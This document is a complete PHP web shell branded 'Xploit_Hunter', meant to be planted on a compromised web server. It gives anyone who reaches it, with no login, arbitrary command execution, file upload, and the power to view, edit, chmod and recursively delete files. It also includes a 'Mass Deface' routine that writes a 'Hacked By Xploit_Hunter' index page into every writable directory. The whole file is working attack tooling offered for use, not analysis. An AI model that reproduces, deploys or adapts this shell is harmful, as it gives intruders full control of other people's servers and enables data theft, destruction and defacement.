<?php
/**
 * --- Xploit_Hunter ---
 **/
error_reporting(0);
session_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "Xploit_Hunter";
$author = "Xploit_Hunter";
$theme_bg = "#0a0a0f";
$theme_fg = "#E0FF00";
$theme_highlight = "#FF00C8";
$theme_link = "#00FFF7";
$theme_link_hover = "#FF00A0";
$theme_border_color = "#7D00FF";
$theme_table_header_bg = "#1a0025";
$theme_table_row_hover = "#330033";
$theme_input_bg = "#120024";
$theme_input_fg = "#00FFB2";
$font_family = "'Orbitron', sans-serif";
$message_success_color = "#39FF14";
$message_error_color = "#FF0033";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    return basename($filename);
}

function exe($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd);
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }
    return "Command execution disabled.";
}

function perms($file){
    $perms = @fileperms($file);
    if ($perms === false) return '????';
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    if (!file_exists($target)) return true;
    if (!is_dir($target)) return unlink($target);
    $items = scandir($target);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($target);
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    header("Location: ?" . http_build_query($params));
    exit();
}

// --- INITIAL SETUP & PATH ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_FILES['file_upload'])){
    $file_name = sanitizeFilename($_FILES['file_upload']['name']);
    if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)){
        redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path);
    }else{
        redirect_with_message('error', 'File failed to upload !!', $path);
    }
}

if(isset($_GET['option']) && isset($_POST['opt_action'])){
    $target_full_path = $_POST['path_target'];
    $action = $_POST['opt_action'];
    $current_dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
    switch ($action) {
        case 'delete':
            if (file_exists($target_full_path)) {
                if (delete_recursive($target_full_path)) {
                    redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir);
                } else {
                    redirect_with_message('error', 'Failed to delete! Check (permission).', $current_dir);
                }
            } else {
                redirect_with_message('error', 'Target not found!', $current_dir);
            }
            break;
        case 'chmod_save':
            $perm = octdec($_POST['perm_value']);
            if(chmod($target_full_path,$perm)) redirect_with_message('success', 'CHANGE PERMISSION SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'Failed to change permissions!!', $current_dir);
            break;
        case 'rename_save':
            $new_name_base = sanitizeFilename($_POST['new_name_value']);
            $new_full_path = dirname($target_full_path).'/'.$new_name_base;
            if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'CHANGE NAME SUCCESS !!', $current_dir);
            else redirect_with_message('error', 'Failed to update the name.', $current_dir);
            break;
        case 'edit_save':
            if(is_writable($target_full_path)) {
                if(file_put_contents($target_full_path,$_POST['src_content'])) redirect_with_message('success', 'EDIT FILE SUCCESS !!', $current_dir);
                else redirect_with_message('error', 'Failed to edit file!!', $current_dir);
            } else {
                redirect_with_message('error', 'File write permission denied.', $current_dir);
            }
            break;
    }
}

if(isset($_GET['create_new'])) {
    $create_name = sanitizeFilename($_POST['create_name']);
    $target_path_new = $path . '/' . $create_name;
    if ($_POST['create_type'] == 'file') {
        if (file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'New file created successfully.', $path);
        else redirect_with_message('error', 'Failed to create a new file!', $path);
    } elseif ($_POST['create_type'] == 'dir') {
        if (mkdir($target_path_new)) redirect_with_message('success', 'New folder created successfully.', $path);
        else redirect_with_message('error', 'Failed to create a new folder!', $path);
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<title><?php echo htmlspecialchars($title); ?></title>
<style>
  body {
    background-color: #0f0f23;
    color: #00ffe7;
    font-family: 'Share Tech Mono', monospace;
    margin: 0;
    padding: 0;
  }
  h1 {
    color: #ff2bd4;
    text-align: center;
    font-size: 36px;
    text-shadow: 0 0 5px #ff2bd4, 0 0 10px #ff2bd4;
    margin: 20px 0;
  }
  a {
    color: #00b7ff;
    text-decoration: none;
    transition: 0.2s;
  }
  a:hover {
    color: #ff2bd4;
    text-shadow: 0 0 5px #ff2bd4;
  }
  table {
    width: 95%;
    max-width: 1000px;
    margin: 20px auto;
    border-collapse: collapse;
    background-color: #1a1a2e;
    border: 1px solid #8000ff;
  }
  th, td {
    border: 1px solid #8000ff;
    padding: 10px;
    text-align: left;
  }
  #content tr:hover {
    background-color: #29294d;
  }
  .first {
    background-color: #191935;
    color: #ff2bd4;
  }
  input, select, textarea {
    background: #0d0d20;
    color: #00ffe7;
    border: 1px solid #8000ff;
    padding: 5px;
    font-family: 'Share Tech Mono', monospace;
    border-radius: 5px;
  }
  input[type="submit"] {
    background: #ff2bd4;
    color: black;
    font-weight: bold;
    border: 1px solid #8000ff;
    cursor: pointer;
    transition: 0.2s ease-in-out;
  }
  input[type="submit"]:hover {
    background: #00ffe7;
    color: #000;
    box-shadow: 0 0 5px #00ffe7, 0 0 10px #00ffe7;
  }
  .section-box {
    border: 2px solid #8000ff;
    padding: 15px;
    margin: 20px auto;
    border-radius: 8px;
    background-color: #1a1a2e;
    color: #00ffe7;
    width: 95%;
    max-width: 900px;
  }
  .main-menu {
    text-align: center;
    padding: 15px;
    margin: 20px auto;
    border-top: 1px solid #8000ff;
    border-bottom: 1px solid #8000ff;
  }
  .main-menu a {
    margin: 0 10px;
    font-size: 1.1em;
    color: #00b7ff;
  }
  pre {
    background-color: #111122;
    padding: 10px;
    overflow-x: auto;
    color: #ff2bd4;
    border: 1px solid #8000ff;
  }
  .message {
    text-align: center;
    font-weight: bold;
    padding: 10px;
    margin: 10px auto;
    width: 95%;
    max-width: 900px;
    border-radius: 8px;
  }
  .message.success {
    background-color: #008f39;
    color: #00ffe7;
  }
  .message.error {
    background-color: #a80000;
    color: white;
  }
  footer {
    text-align: center;
    color: #ff2bd4;
    margin: 20px 0;
    font-size: 14px;
    text-shadow: 0 0 5px #8000ff;
  }
  .action-form {
    display: inline-block;
    margin: 0;
  }
  .action-button {
    background: #ff2bd4;
    color: black;
    font-weight: bold;
    border: 1px solid #8000ff;
    cursor: pointer;
    padding: 5px 10px;
    border-radius: 5px;
    margin-left: 5px;
    transition: 0.2s ease-in-out;
  }
  .action-button:hover {
    background: #00ffe7;
    color: #000;
    box-shadow: 0 0 5px #00ffe7, 0 0 10px #00ffe7;
  }
</style>
</head>
<body>
<a href="?">
    <div style="text-align: center; margin: 20px 0;">
        <img src="https://raw.githubusercontent.com/xploithunter5/Xploit_Hunter/main/Xploit_Hunter.png" 
             alt="Hacked By Xploit_Hunter." 
             style="
                display: block;
                margin-left: auto;
                margin-right: auto;
                width: 180px;
                height: 180px;
                object-fit: cover;
                border-radius: 25px;
                border: none;
                box-shadow: none;
             ">
    </div>
    <h1 style="color: white; text-align: center; margin-top: 10px;"><?php echo htmlspecialchars($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) {
    echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>";
}
?>
<table class="system-info-table" width="95%" border="0" cellpadding="0" cellspacing="0" align="left">
<tr><td>
<font color='white'><i class='fa fa-user'></i> User / IP </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo $_SERVER['REMOTE_ADDRESS']; ?></font>
<tr><td><font color='white'><i class='fa fa-desktop'></i> Host / Server </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></font>
<tr><td><font color='white'><i class='fa fa-hdd-o'></i> System </font><td>: <font color='<?php echo $theme_fg; ?>'><?php echo php_uname(); ?></font>
</tr></td></table>
<div class="main-menu">
    <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
    <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.urlencode($current_built_path).'">'.htmlspecialchars($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    $current_action = $_GET['action'];
    echo '<div class="section-box">';
    switch ($current_action) {
        case 'cmd':
            $cmd_output = '';
            if(isset($_POST['do_cmd'])) {
                $cmd_output = htmlspecialchars(exe($_POST['cmd_input']));
            }
            echo '<h3>Execute Command</h3>';
            echo '<form method="POST" action="?action=cmd&path='.urlencode($path).'">';
            echo '<input type="text" name="cmd_input" placeholder="whoami" style="width: calc(100% - 80px);" autofocus>';
            echo '<input type="submit" name="do_cmd" value=">>" style="width: 70px;">';
            echo '</form>';
            if($cmd_output) {
                echo '<h4>Output:</h4><pre>'.$cmd_output.'</pre>';
            }
            break;
        case 'upload_form':
            echo '<h3>Upload File</h3>';
            echo '<form enctype="multipart/form-data" method="POST" action="?path='.urlencode($path).'">';
            echo '<input type="file" name="file_upload" required/>';
            echo '<input type="submit" value="UPLOAD" style="margin-left:10px;"/>';
            echo '</form>';
            break;
        case 'mass_deface_form':
            $mass_deface_results = '';
            if(isset($_POST['start_mass_deface'])) {
                function sabun_massal_recursive($dir, $file, $content, &$res) {
                    if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)." (Not Writable)<br>"; return;}
                    foreach(scandir($dir) as $item) {
                        if($item === '.' || $item === '..') continue;
                        $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
                        if(is_dir($lokasi)) {
                            file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                            $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
                            sabun_massal_recursive($lokasi, $file, $content, $res);
                        }
                    }
                }
                function sabun_biasa($dir, $file, $content, &$res) {
                    if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)." (Not Writable)<br>"; return;}
                    foreach(scandir($dir) as $item) {
                        if($item === '.' || $item === '..') continue;
                        $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
                        if(is_dir($lokasi) && is_writable($lokasi)) {
                            file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content);
                            $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>";
                        }
                    }
                }
                if($_POST['tipe_sabun'] == 'mahal') sabun_massal_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
                else sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results);
            }
            echo '<h3>Mass Deface</h3>';
            echo '<form method="post" action="?action=mass_deface_form&path='.urlencode($path).'">';
            echo '<p>Type:<br>
                <input type="radio" name="tipe_sabun" value="murah" checked>
                Normal (1 level) |
                <input type="radio" name="tipe_sabun" value="mahal">
                Mass (Recursive)
                </p>';
            echo '<p>Target Folder:<br>
                <input type="text" name="d_dir" value="'.htmlspecialchars($path).'" style="width:100%">
                </p>';
            echo '<p>File Name:<br>
                <input type="text" name="d_file" value="index.html" style="width:100%">
                </p>';
            echo '<p>Script Content:<br>
                <textarea name="script_content" style="width:100%;height:150px">Hacked By Xploit_Hunter</textarea></p>';
            echo '<input type="submit" name="start_mass_deface" value="START!" style="width:100%">';
            echo '</form>';

            if($mass_deface_results) echo '<h4>Edit failed!:</h4><pre>'.$mass_deface_results.'</pre>';
            break;
        case 'create_form':
            echo '<h3>Create New File / Folder</h3>';
            echo '<form method="POST" action="?create_new=true&path='.urlencode($path).'">';
            echo 'Create: <select name="create_type"><option value="file">File</option><option value="dir">Folder</option></select> ';
            echo 'Name: <input type="text" name="create_name" required> ';
            echo '<input type="submit" value="Create">';
            echo '</form>';
            break;
        case 'delete':
            $file_to_delete = $_GET['target_file'];
            echo "<h3>Konfirmasi Hapus: ".htmlspecialchars(basename($file_to_delete))."</h3>";
            if (file_exists($file_to_delete)) {
                echo '<p style="color:red;text-align:center;">Are you SURE you want to delete this item?<br>This action cannot be undone.</p>';
                echo '<form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($file_to_delete).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>';
            } else {
                echo '<p style="color:red;text-align:center;">File or folder not found!</p>';
            }
            break;
        case 'view_file':
            echo "<h3>Viewing: ".htmlspecialchars(basename($_GET['target_file']))."</h3>";
            echo '<textarea style="width:100%;height:400px;" readonly>'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea>';
            break;
        case 'edit_form':
            $target_file = $_GET['target_file'];
            echo "<h3>Editing: ".htmlspecialchars(basename($target_file))."</h3>";
            if(is_writable($target_file)) {
                $file_content = @file_get_contents($target_file);
                echo '<form method="POST" action="?option=true&path='.urlencode($path).'">';
                echo '<textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars($file_content).'</textarea><br>';
                echo '<input type="hidden" name="path_target" value="'.htmlspecialchars($target_file).'">';
                echo '<input type="hidden" name="opt_action" value="edit_save">';
                echo '<input type="submit" value="SAVE"/>';
                echo '</form>';
            } else {
                echo '<p style="color:red;">File is not writable! Check permissions.</p>';
                echo '<textarea style="width:100%;height:400px;" readonly>'.htmlspecialchars(@file_get_contents($target_file)).'</textarea>';
            }
            break;
        case 'rename_form':
            echo "<h3>Rename: ".htmlspecialchars(basename($_GET['target_file']))."</h3>";
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">New Name: <input name="new_name_value" type="text" value="'.htmlspecialchars(basename($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>';
            break;
        case 'chmod_form':
            echo "<h3>Chmod: ".htmlspecialchars(basename($_GET['target_file']))."</h3>";
            $current_perms = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4);
            echo '<form method="POST" action="?option=true&path='.urlencode($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>';
            break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<div id="content"><table><tr class="first"><th><center>Name</center></th><th><center>Size</center></th><th><center>Perm</center></th><th><center>Options</center></th></tr>';
    $scandir_items = @scandir($path);
    if ($scandir_items) {
        usort($scandir_items, function($a, $b) use ($path) {
            $pathA = $path . '/' . $a; $pathB = $path . '/' . $b;
            $is_dir_A = is_dir($pathA); $is_dir_B = is_dir($pathB);
            if ($is_dir_A && !$is_dir_B) return -1;
            if (!$is_dir_A && $is_dir_B) return 1;
            return strcasecmp($a, $b);
        });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.'/'.$item;
            $encoded_full_item_path = urlencode($full_item_path);
            echo "<tr><td class='td_home'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".urlencode(dirname($path))."\">".htmlspecialchars($item)."</a></td>";
            elseif(is_dir($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".htmlspecialchars($item)."</a></td>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".urlencode($path)."\">".htmlspecialchars($item)."</a></td>";
            echo "<td class='td_home'><center>".(is_file($full_item_path) ? round(@filesize($full_item_path)/1024,2).' KB' : '--')."</center></td>";
            echo "<td class='td_home'><center>";
            $perms_str = perms($full_item_path);
            if(is_writable($full_item_path)) echo '<font color="#57FF00">'.$perms_str.'</font>';
            elseif(!is_readable($full_item_path)) echo '<font color="#FF0004">'.$perms_str.'</font>';
            else echo $perms_str;
            echo "</center></td>";
            echo "<td class='td_home' style='text-align:center;'>
                <form class='action-form' method='GET' action='?'>
                    <input type='hidden' name='path' value='".htmlspecialchars($path)."'>
                    <select name='action' style='width:100px;'>
                        <option value=''>Action</option>
                        <option value='delete'>Delete</option>";
            if(is_file($full_item_path)) {
                echo "<option value='edit_form'>Edit</option>";
                echo "<option value='view_file'>View</option>";
            }
            echo "<option value='rename_form'>Rename</option>
                        <option value='chmod_form'>Chmod</option>
                    </select>
                    <input type='hidden' name='target_file' value='".htmlspecialchars($full_item_path)."'>
                    <button type='submit' class='action-button'>Go</button>
                </form>
            </td></tr>";
        }
    } else {
        echo "<tr><td colspan='4'><center><font color='red'>Failed to read directory.</font></center></td></tr>";
    }
    echo '</table></div>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 900px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo htmlspecialchars($author); ?></font></b></center>
</body>
</html>
